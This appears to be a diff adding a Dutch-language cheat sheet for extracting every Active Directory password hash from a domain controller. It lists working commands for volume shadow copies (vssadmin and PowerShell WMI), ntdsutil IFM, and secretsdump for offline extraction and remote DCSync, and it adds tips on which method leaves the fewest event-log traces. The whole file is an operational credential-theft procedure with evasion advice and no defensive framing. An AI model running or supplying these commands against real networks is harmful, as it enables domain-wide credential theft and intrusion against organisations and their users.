@@ -1,0 +1,17 @@
+# NTDS.dit Dumpen - Alle AD wachtwoord hashes extraheren
+# Vereist: Domain Admin of vergelijkbare rechten op de DC
+# Methode 1: Volume Shadow Copy (vssadmin)
+vssadmin create shadow /for=C:
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Windows\tasks\ntds.dit
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\tasks\SYSTEM
+# Methode 2: ntdsutil (built-in)
+ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\tasks\ntds_dump" quit quit
+# Methode 3: PowerShell Shadow Copy
+(Get-WmiObject -List Win32_ShadowCopy).Create("C:\","ClientAccessible")
+# Offline extractie met secretsdump (Kali):
+# secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
+# Methode 4: DCSync via secretsdump (remote, geen bestanden nodig)
+# secretsdump.py DOMAIN/username:password@DC_IP
+# Tip: VSS shadow copy aanmaken genereert Event ID 8222
+# Tip: ntdsutil IFM is het stilste alternatief
+# Tip: Vergeet de SYSTEM hive niet (bevat de boot key)
